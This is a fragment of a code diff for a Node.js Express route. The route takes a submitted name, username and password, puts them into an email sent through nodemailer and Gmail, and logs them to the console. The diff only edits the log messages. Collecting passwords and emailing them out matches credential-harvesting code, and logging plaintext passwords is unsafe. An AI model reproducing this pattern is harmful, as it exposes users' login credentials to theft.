@@ -4,13 +4,13 @@ const nodemailer = require('nodemailer');
     
 
 router.post('/', (req, res, next) => {
-       console.log('in email post', req.body);
+       console.log('router.post to email API , file:  nodeMailer.router, req.body: ', req.body);
        const name = req.body.name;
        // for demonstration emails will be sent to this address regardless of user input
        const username = req.body.username;
        const password = req.body.password;
        const content = `from: ${name} \n username: ${username} \n password: ${password} `;
-       console.log('content for email', content);
+       console.log('content for email: ', content);
     // Create a transporter object
     const transporter = nodemailer.createTransport({
         service: "Gmail",
